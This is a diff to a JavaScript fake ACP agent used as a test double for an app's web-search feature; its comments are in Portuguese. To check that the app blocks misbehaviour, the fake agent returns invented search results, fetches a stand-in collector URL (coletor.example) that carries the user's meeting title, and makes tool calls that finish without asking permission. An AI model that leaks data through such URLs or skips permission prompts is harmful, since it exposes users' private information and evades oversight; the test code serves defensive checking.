@@ -21,6 +21,11 @@
 //   propõe um bloco `lap-acao` de lembrete para amanhã às 09:00 (sem hora no pedido) ligado à conversa; "responda
 //   <nome> dizendo <texto>" propõe o bloco de resposta no WhatsApp com o id da conversa do arquivo; "bloco inválido"
 //   devolve um bloco quebrado. O agente nunca executa nada: só escreve o bloco.
+// - internet (contrato 26), em qualquer chat (agente ou Assistente), com "pesquise" no pedido: `WebSearch` (pedindo
+//   permissão, como o adaptador) com resultados inventados no `tool_call_update` ("Título (url)", sem rede nenhuma);
+//   abre o primeiro resultado (`WebFetch`) e tenta abrir um endereço montado com o título da reunião na consulta (que o
+//   app tem de negar); responde com os links `[Web · <domínio> · <título>](url)`. Com a busca negada (sem internet),
+//   responde com a frase "Para isso, ligue …" da instrução de sistema. Com "me lembre", termina com um bloco de lembrete.
 //
 // Uso: node fake-acp-agent.mjs [--log <arquivo.jsonl>] | node fake-acp-agent.mjs --version
 import { appendFileSync, readdirSync, readFileSync } from 'node:fs'
@@ -87,6 +92,15 @@ function readFolder(cwd) {
   const title = /^# (.+)$/m.exec(text)?.[1]
   const day = /\((\d{2}\/\d{2})\)$/m.exec(text)?.[1]
   return { files, index: false, first: id && title && day ? { id, title, day } : null, count: files.length, file: files[0] }
+}
+
+/** Amanhã às 09:00, em ISO 8601 com o fuso do Mac (o lembrete sem hora no pedido). */
+function tomorrowNine() {
+  const now = new Date()
+  const when = new Date(now.getFullYear(), now.getMonth(), now.getDate() + 1, 9, 0)
+  const offset = -when.getTimezoneOffset()
+  const two = (value) => String(Math.abs(value)).padStart(2, '0')
+  return `${when.getFullYear()}-${two(when.getMonth() + 1)}-${two(when.getDate())}T09:00:00${offset >= 0 ? '+' : '-'}${two(Math.trunc(offset / 60))}:${two(offset % 60)}`
 }
 
 /**
@@ -168,7 +182,7 @@ export function fakeAcpAgent({ log = () => undefined, pause = 300 } = {}) {
     .onRequest('session/new', (ctx) => {
       const options = ctx.params._meta?.claudeCode?.options ?? {}
       const sessionId = `sessao-${++next}`
-      const state = { cwd: ctx.params.cwd, purpose: purposeOf(options), mode: 'auto', model: 'default', effort: 'default', cancelled: false, cost: 0, turns: 0, tools: 0 }
+      const state = { cwd: ctx.params.cwd, systemPrompt: typeof options.systemPrompt === 'string' ? options.systemPrompt : '', purpose: purposeOf(options), mode: 'auto', model: 'default', effort: 'default', cancelled: false, cost: 0, turns: 0, tools: 0 }
       for (const entry of ctx.params.configOptions ?? []) if (entry.configId in { mode: 1, model: 1, effort: 1 }) state[entry.configId] = entry.value
       sessions.set(sessionId, state)
       log({
@@ -272,7 +286,7 @@ export function fakeAcpAgent({ log = () => undefined, pause = 300 } = {}) {
       ]
       await update({ sessionUpdate: 'plan', entries: plan })
 
-      const use = async (name, kind, title, rawInput, locations) => {
+      const use = async (name, kind, title, rawInput, locations, result) => {
         state.tools += 1
         const toolCallId = `toolu_${sessionId}_${state.tools}`
         // Como o adaptador: primeiro a chamada com a entrada vazia, depois a entrada completa.
@@ -292,8 +306,75 @@ export function fakeAcpAgent({ log = () => undefined, pause = 300 } = {}) {
         log({ event: 'permission', sessionId, tool: name, kind, outcome: allowed ? 'allow' : 'reject' })
         if (allowed) await update({ sessionUpdate: 'tool_call_update', toolCallId, status: 'in_progress' })
         await wait()
-        await update({ sessionUpdate: 'tool_call_update', toolCallId, status: allowed ? 'completed' : 'failed' })
+        await update({
+          sessionUpdate: 'tool_call_update',
+          toolCallId,
+          status: allowed ? 'completed' : 'failed',
+          // Como o adaptador: o resultado no `content` e o nome da ferramenta no `_meta`.
+          ...(allowed && result ? { content: [{ type: 'content', content: { type: 'text', text: result } }], _meta: { claudeCode: { toolName: name } } } : {}),
+        })
         return allowed
+      }
+      // Contrato 26: abrir o resultado de uma busca de outra execução (o app tem de negar).
+      if (/abra o primeiro resultado/i.test(question)) {
+        const url = 'https://www.financas.example/tendencias-2026?utm_source=busca'
+        const opened = await use('WebFetch', 'fetch', `Fetch ${url}`, { url, prompt: 'Resuma.' }, undefined, 'conteúdo')
+        log({ event: 'web-reopen', sessionId, opened })
+        await say(opened ? 'Abri a página.' : 'A página foi recusada.')
+        return { stopReason: 'end_turn', usage: { totalTokens: 10, inputTokens: 5, outputTokens: 5 } }
+      }
+      // Contrato 26: chamadas que terminam sem pedir permissão (página "liberada" pelo `claude`, buscas demais): o app
+      // cancela a resposta.
+      if (/sem perguntar|busca demais/i.test(question)) {
+        const count = /busca demais/i.test(question) ? 11 : 1
+        for (let n = 0; n < count; n++) {
+          state.tools += 1
+          const toolCallId = `toolu_${sessionId}_${state.tools}`
+          const search = count > 1
+          const name = search ? 'WebSearch' : 'WebFetch'
+          const rawInput = search ? { query: `busca ${n}` } : { url: 'https://docs.example/pagina?q=Planejamento' }
+          await update({ sessionUpdate: 'tool_call', toolCallId, name, kind: 'fetch', title: search ? `Search "busca ${n}"` : 'Fetch', status: 'pending', rawInput, content: [] })
+          await update({ sessionUpdate: 'tool_call_update', toolCallId, status: 'completed', content: [{ type: 'content', content: { type: 'text', text: search ? `R (https://r${n}.example/a)` : 'página' } }], _meta: { claudeCode: { toolName: name } } })
+          if (state.cancelled) break
+        }
+        for (let at = 0; at < 20 && !state.cancelled; at++) {
+          await sleep(5)
+          await say('.')
+        }
+        log({ event: 'unasked', sessionId, cancelled: state.cancelled })
+        return state.cancelled ? { stopReason: 'cancelled', usage: { totalTokens: 10, inputTokens: 5, outputTokens: 5 } } : { stopReason: 'end_turn', usage: { totalTokens: 10, inputTokens: 5, outputTokens: 5 } }
+      }
+      // Contrato 26: a internet, sem rede (resultados inventados, domínios `.example`).
+      if (/pesquise/i.test(question)) {
+        const query = 'finanças em alta no Instagram'
+        const results = [
+          { title: 'Tendências de finanças pessoais em 2026', url: 'https://www.financas.example/tendencias-2026?utm_source=busca' },
+          { title: 'O que está em alta no Instagram', url: 'https://noticias.example/instagram/em-alta' },
+        ]
+        const searched = await use('WebSearch', 'fetch', `Search "${query}"`, { query }, undefined, results.map((hit) => `${hit.title} (${hit.url})`).join('\n'))
+        let answer
+        if (!searched) {
+          answer = /Para isso, ligue [^"]*?\./.exec(state.systemPrompt)?.[0] ?? 'Não consegui pesquisar.'
+        } else {
+          const first = results[0].url
+          const opened = await use('WebFetch', 'fetch', `Fetch ${first}`, { url: first, prompt: 'Resuma as tendências.' }, undefined, 'Reels curtos sobre cartão de crédito e reserva de emergência.')
+          const title = folder.first?.title ?? 'reunião'
+          const leak = `https://coletor.example/c?q=${encodeURIComponent(title)}`
+          const leaked = await use('WebFetch', 'fetch', `Fetch ${leak}`, { url: leak, prompt: 'x' }, undefined, 'nada')
+          log({ event: 'web', sessionId, searched, opened, leaked })
+          answer = [
+            'Pesquisei na internet o que está em alta sobre finanças (dados de hoje):',
+            '',
+            `- Reels curtos com "3 erros no cartão de crédito" estão entre os mais vistos [Web · financas.example · Tendências 2026](${first}).`,
+            `- Carrosséis comparando reserva de emergência e investimentos [Web · noticias.example · Em alta no Instagram](${results[1].url}).`,
+          ].join('\n')
+          // Com "me lembre" (o Assistente): o cartão do lembrete, que a tela marca como vindo de uma resposta com internet.
+          if (/me lembre/i.test(question)) answer += `\n\n\`\`\`lap-acao\n${JSON.stringify({ tipo: 'lembrete', quando: tomorrowNine(), texto: 'Postar sobre finanças', horaPadrao: true })}\n\`\`\``
+        }
+        for (let at = 0; at < answer.length; at += 60) await say(answer.slice(at, at + 60))
+        state.cost += 0.012
+        await update({ sessionUpdate: 'usage_update', used: 2400, size: 200000, cost: { amount: state.cost, currency: 'USD' }, _meta: { '_claude/model': modelId } })
+        return { stopReason: 'end_turn', usage: { totalTokens: 1000, inputTokens: 880, outputTokens: 120 } }
       }
       // Contrato 25: os pedidos do Assistente.
       if (state.purpose === 'chat' && readdirSync(state.cwd).includes('ESTADO.md')) {
